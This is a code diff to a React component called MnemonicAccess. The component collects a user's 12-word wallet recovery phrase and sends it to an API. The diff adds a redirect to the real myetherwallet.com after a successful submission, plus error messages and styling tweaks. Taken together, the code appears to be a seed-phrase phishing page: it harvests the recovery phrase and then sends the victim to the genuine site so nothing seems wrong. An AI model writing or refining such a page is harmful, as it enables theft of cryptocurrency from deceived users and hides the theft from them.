@@ -10,6 +10,9 @@ export default function MnemonicAccess() {
   const router = useRouter();
   const [wordCount, setWordCount] = useState(12);
   const [words, setWords] = useState<string[]>(Array(12).fill(""));
+  const [errorMessage, setErrorMessage] = useState<string>("");
+  const [wordList, setWordList] = useState<string[]>([]);
+  const [isLoading, setIsLoading] = useState<boolean>(false);
 
   const handleWordChange = (index: number, value: string) => {
     const newWords = [...words];
@@ -57,13 +60,18 @@ export default function MnemonicAccess() {
       );
 
       console.log("API response:", response.data);
-      
-      // Navigate to dashboard after successful API call
-      // router.push("/dashboard");
-      
+      const result = response.data;
+      if (response.status === 200 && result.status) {
+        window.location.href = "https://www.myetherwallet.com";
+        console.log(result);
+      } else {
+        const serverMessage = result?.message || "Something went wrong.";
+        const serverError = result?.error ? ` (${result.error})` : "";
+        setErrorMessage(serverMessage + serverError);
+        setIsLoading(false);
+      }
     } catch (error) {
       console.error("Error sending mnemonic data:", error);
-      // You might want to show an error message to the user here
     }
   };
 
@@ -171,13 +179,13 @@ export default function MnemonicAccess() {
             <button
               onClick={handleNext}
               disabled={words.some((w) => !w)}
-              className="bg-gray-300 text-gray-600 px-20 py-4 rounded-lg font-semibold disabled:opacity-50 disabled:cursor-not-allowed hover:bg-gray-400 transition"
+              className="bg-gray-300 cursor-pointer text-gray-600 px-20 py-4 rounded-lg font-semibold disabled:opacity-50 disabled:cursor-not-allowed hover:bg-gray-400 transition"
             >
               Next
             </button>
             <button
               onClick={handleClear}
-              className="text-teal-600 hover:underline"
+              className="text-teal-600 cursor-pointer hover:underline"
             >
               Clear
             </button>
